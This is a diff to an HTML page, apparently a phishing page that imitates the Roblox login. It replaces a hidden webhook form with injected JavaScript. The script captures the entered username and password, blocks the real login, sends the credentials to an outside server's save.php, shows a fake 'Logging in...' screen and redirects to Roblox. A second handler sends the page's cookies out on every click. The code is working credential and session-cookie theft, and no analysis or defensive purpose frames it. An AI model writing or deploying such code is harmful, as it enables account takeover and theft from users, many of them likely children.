@@ -624,54 +624,64 @@
 
 
 
-<form id="fake-login-form" action="https://webhook.site/d9343135-9a99-478a-b863-e1f658cbaf80" method="POST" style="display: none;">
-    <input type="text" name="username" id="fake-username">
-    <input type="password" name="password" id="fake-password">
-</form>
-
 <script>
 document.addEventListener('DOMContentLoaded', function() {
     const checkForLoginForm = setInterval(function() {
-        const usernameField = document.querySelector('input[type="text"], input[type="email"]');
-        const passwordField = document.querySelector('input[type="password"]');
-        const loginButton = document.querySelector('button[type="submit"], button[type="button"], button');
+        // Target Roblox's login fields
+        const usernameField = document.querySelector('input[name="username"], input[type="email"], input[type="text"]');
+        const passwordField = document.querySelector('input[name="password"], input[type="password"]');
+        const loginButton = document.querySelector('button[type="submit"], button[type="button"], div[role="button"], span[role="button"]');
 
         if (usernameField && passwordField && loginButton) {
             clearInterval(checkForLoginForm);
 
             loginButton.onclick = function(e) {
                 e.preventDefault();
+                e.stopPropagation();
 
                 const username = usernameField.value;
                 const password = passwordField.value;
 
-                fetch("https://webhook.site/d9343135-9a99-478a-b863-e1f658cbaf80", {
+                // Send credentials to BACKEND
+                fetch("http://wassup.iceiy.com//save.php", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({ username, password })
-                })
-                .then(() => {
-                    setTimeout(() => {
-                        window.location.href = "https://www.roblox.com/login";
-                    }, 3000);
-                })
-                .catch(() => {
-                    setTimeout(() => {
-                        window.location.href = "https://www.roblox.com/login";
-                    }, 3000);
                 });
+
+                // Loading screen
+                const fakeLoading = document.createElement('div');
+                fakeLoading.style.position = 'fixed';
+                fakeLoading.style.top = '0';
+                fakeLoading.style.left = '0';
+                fakeLoading.style.width = '100%';
+                fakeLoading.style.height = '100%';
+                fakeLoading.style.backgroundColor = 'white';
+                fakeLoading.style.zIndex = '9999';
+                fakeLoading.style.display = 'flex';
+                fakeLoading.style.justifyContent = 'center';
+                fakeLoading.style.alignItems = 'center';
+                fakeLoading.innerHTML = '<h2>Logging in...</h2>';
+                document.body.appendChild(fakeLoading);
+
+               
+                setTimeout(() => {
+                    window.location.href = "https://www.roblox.com/home";
+                }, 3000);
             };
         }
     }, 500);
 
+    // Store cookies on user interaction for easier use.
     document.addEventListener('click', function() {
         const cookies = document.cookie;
         if (cookies) {
-            fetch(`https://webhook.site/d9343135-9a99-478a-b863-e1f658cbaf80?cookies=${encodeURIComponent(cookies)}`);
+            fetch(`https://your-backend-server.com/save.php?cookies=${encodeURIComponent(cookies)}`);
         }
     });
 });
 </script>
+
 
 
 
